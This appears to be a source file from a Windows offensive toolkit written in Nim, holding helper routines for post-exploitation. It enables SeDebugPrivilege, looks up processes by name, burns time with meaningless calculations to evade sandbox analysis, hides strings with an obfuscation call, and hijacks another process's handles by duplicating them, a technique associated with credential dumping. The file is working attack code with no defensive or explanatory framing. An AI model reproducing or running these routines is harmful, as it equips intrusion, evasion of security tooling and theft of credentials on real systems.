include defs
import math
import times 
import random


proc `+`*[S: SomeInteger](p: pointer, offset: S): pointer =
    return cast[pointer](cast[ByteAddress](p) +% int(offset))


proc toString*(bytes: openarray[byte]): string =
    result = newString(bytes.len)
    copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)


proc toString*(chars: openArray[WCHAR]): string =
    result = ""
    for c in chars:
        if cast[char](c) == '\0':
            break
        result.add(cast[char](c))


proc getPid*(pname: string): int =
    var entry: PROCESSENTRY32
    var hSnapshot: HANDLE
    entry.dwSize = cast[DWORD](sizeof(PROCESSENTRY32))
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)
    defer: CloseHandle(hSnapshot)
    if Process32First(hSnapshot, addr entry):
        while Process32Next(hSnapshot, addr entry):
            if entry.szExeFile.toString == pname:
                return int(entry.th32ProcessID)
    return 0


proc setDebugPrivilege*(): bool =
    # Inits
    var tp : TOKEN_PRIVILEGES
    var luid: LUID 
    var HTtoken: HANDLE
    var lpszPrivilege = protectString("SeDebugPrivilege")
    # Open current process token
    discard OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &HTtoken)
    # Get current privilege
    if LookupPrivilegeValue(NULL, lpszPrivilege, &luid) == 0:
        return false
    # Enable privilege
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
    tp.PrivilegeCount = 1
    tp.Privileges[0].Luid = luid
    # Set privilege
    if AdjustTokenPrivileges(HTtoken, FALSE, &tp, cast[DWORD](sizeof(TOKEN_PRIVILEGES)), NULL, NULL) == 0:
        return false
    # Success
    return true


proc sleepUselessCalculations*(secondsToSleep: int) =
    var x: float
    var y: float
    var z: float
    randomize()
    var startTime = now()
    while (now() - startTime).inSeconds < secondsToSleep:
        for _ in countdown(rand(5619989), 87):
            x = rand(rand(rand(511.888)) mod  9811)
            y = rand(rand(6313.9999)) + log2(cos(1.87 * PI)) 
            z = rand(836.3214789 - x mod y) 
            y = sqrt(float(x * y + 37)) * sqrt(float(x / (y + 1111))) + exp(float(x * z))


proc ntQueryObjectWrapper(x: HANDLE, y: OBJECT_INFORMATION_CLASS): ptr BYTE =
    var InformationLength: ULONG = 0
    var Ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
    var Information: pointer
    while Ntstatus == STATUS_INFO_LENGTH_MISMATCH:
        Information = realloc(Information, InformationLength)
        Ntstatus = NtQueryObject(x, y, Information, InformationLength, addr InformationLength)
    return cast[PBYTE](Information)


proc hijackProcessHandle*(wsObjectType: PWSTR, p_hTarget: HANDLE, dwDesiredAccess: DWORD): HANDLE =
    var InformationLength: ULONG = 0
    var Ntstatus: NTSTATUS = STATUS_INFO_LENGTH_MISMATCH
    var Information: pointer
    while Ntstatus == STATUS_INFO_LENGTH_MISMATCH:
        Information = realloc(Information, InformationLength)
        Ntstatus = NtQueryInformationProcess(
            p_hTarget, 
            PROCESS_HANDLE_INFORMATION,
            Information, 
            InformationLength, 
            addr InformationLength
        )
    let pProcessHandleInformation = cast[PPROCESS_HANDLE_SNAPSHOT_INFORMATION](Information)
    var p_hDuplicatedObject: HANDLE
    for i in 1 ..< int(pProcessHandleInformation.NumberOfHandles):
        # handle struct pointer = first handle struct address + sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO) * iterator
        var handlePtr = cast[PPROCESS_HANDLE_TABLE_ENTRY_INFO](
            cast[int](addr pProcessHandleInformation.Handles[0]) + 
            sizeof(PROCESS_HANDLE_TABLE_ENTRY_INFO) * i
            )
        if DuplicateHandle(
            p_hTarget, 
            handlePtr.HandleValue, 
            GetCurrentProcess(),
            addr p_hDuplicatedObject, 
            dwDesiredAccess,
            false, 
            0
        ) == 0:
            continue
        let pObjectInformation = ntQueryObjectWrapper(p_hDuplicatedObject, OBJECT_TYPE_INFORMATION)
        let pObjectTypeInformation = cast[PPUBLIC_OBJECT_TYPE_INFORMATION](pObjectInformation)
        if pObjectInformation == nil:
            continue 
        if $wsObjectType == $pObjectTypeInformation.TypeName.Buffer:
            return p_hDuplicatedObject

